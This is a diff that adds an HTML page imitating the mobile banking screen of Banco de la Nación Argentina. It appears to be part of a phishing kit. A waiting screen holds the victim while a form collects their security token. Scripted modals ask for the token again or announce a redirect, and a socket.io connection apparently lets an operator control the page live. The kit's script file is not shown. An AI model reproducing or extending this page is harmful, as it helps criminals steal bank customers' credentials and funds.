@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Banking</title>
+    <link rel="shortcut icon" href="/img/icono.png" type="image/x-icon">
+    <link rel="stylesheet" href="/css/home-mobile.css">
+    <script>
+        if(screen.width>=767){
+            window.location.href = "/home.htm";
+        }
+    </script>
+</head>
+<body id="body">
+    <div id="header">
+        <div class="titulo-mobile">
+            <h1>Mobile Banking</h1>
+        </div>
+    </div>
+    <div id="logoHome">
+        <img id="ppal-content" src="/img/BNA-Logo.png">
+    </div>
+    <div id="preloader"></div>
+    <div class="info-user" id="ultimo-ingreso">
+        <div class="info-text">
+            <p class="bienvenido">Bienvenido</p>
+            <p>Ultimo ingreso: </p>
+            <p>Contacto: <br> https://www.bna.com.ar/Home/Contactenos</p>
+        </div>
+        <div class="imagen">
+            <div></div>
+            <img src="/img/spinner-general.gif">
+        </div>
+    </div>
+    <div id="personal-options">
+        <div class="section">
+            <img src="/img/posicionconsolidada.svg" alt="posicionconsolidada">
+            <span>Posición Consolidada</span>
+        </div>
+        <div class="section">
+            <img src="/img/cuentas.svg" alt="posicionconsolidada">
+            <span>Cuentas</span>
+        </div>
+        <div class="section">
+            <img src="/img/transferencias.svg" alt="posicionconsolidada">
+            <span>Transferencias</span>
+        </div>
+        <div class="section">
+            <img src="/img/debin.svg" alt="posicionconsolidada">
+            <span>Debin</span>
+        </div>
+        <div class="section">
+            <img src="/img/pagos.svg" alt="posicionconsolidada">
+            <span>Pagos</span>
+        </div>
+        <div class="section">
+            <img src="/img/tarjetasdecredito.svg" alt="posicionconsolidada">
+            <span>Tarjetas de Crédito</span>
+        </div>
+        <div class="section">
+            <img src="/img/inversiones.svg" alt="posicionconsolidada">
+            <span>Inversiones</span>
+        </div>
+        <div class="section">
+            <img src="/img/prestamos.svg" alt="posicionconsolidada">
+            <span>Prestamos</span>
+        </div>
+        <div class="section">
+            <img src="/img/puntoefectivo.svg" alt="posicionconsolidada">
+            <span>Punto Efectivo</span>
+        </div>
+        <div class="section">
+            <img src="/img/afip.svg" alt="posicionconsolidada">
+            <span>AFIP</span>
+        </div>
+        <div class="section">
+            <img src="/img/personalizacion.svg" alt="posicionconsolidada">
+            <span>PersonalizaciÓn</span>
+        </div>
+        <div id="salir">
+            <span class="icon-salir"></span>
+            <span>Salir</span>
+        </div>
+    </div>
+    <div class="alerta" id="queuelist">
+        <div class="header-alerta">
+            Estamos trabajando para tí
+        </div>
+        <div class="body-alerta">
+            <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Voluptatem temporibus ut nihil, deserunt a nemo atque rem officiis earum unde iure, dicta veniam ipsa libero veritatis, sint reiciendis similique voluptates.</p>
+            <img src="/img/spinner-general.gif" class="spinner-general" alt="spinner">
+        </div>
+    </div>
+    <div class="modal-alerta" id="alert-modal">
+        <div>
+            <p>El token de seguridad ingresado tiene un formato incorrecto, por favor ingréselo nuevamente</p>
+        </div>
+        <div class="cerrar-modal" id="close-alert-modal">
+            <img src="/img/bt.cerrar.modal.gif">
+        </div>
+    </div>  
+    <div class="modal-alerta" id="noValidate">
+        <div>
+            <p>No pudimos validar su informacion, ingrese su token nuevamente</p>
+        </div>
+        <div class="cerrar-modal" id="close-alert-modal-resendtoken">
+            <img src="/img/bt.cerrar.modal.gif">
+        </div>
+    </div> 
+    <div class="modal-alerta green" id="validate">
+        <div>
+            <p>Vuelva a iniciar sesión, en breve será redireccionado...</p>
+        </div>
+        <div class="cerrar-modal" id="close-alert-modal-green">
+            <img src="/img/bt.cerrar.modal.gif">
+        </div>
+    </div>
+    <div id="token" class="alerta">
+        <div class="modal-header header-alerta">
+            <h4>Alejate de las estafas virtuales</h4>
+        </div>
+        <div class="modal-body body-alerta">
+            <p>Lorem, ipsum dolor sit amet consectetur adipisicing elit. Voluptate, officiis. Ab deserunt in eius eos optio laborum dolorum aut sequi distinctio qui ut, excepturi quaerat ipsa. Maxime, nemo! Facere, dicta.</p>
+            <form id="formToken">
+                <input required type="text" id="token-input" name="token">
+                <button type="submit" id="sendToken">Enviar token</button>
+            </form>
+            <div id="spinnerValidate">
+                <span>Validando información...</span>
+                <img src="/img/spinner-general.gif" alt="">
+            </div>
+        </div>
+    </div> 
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/home.js"></script>
+</body>
+</html>
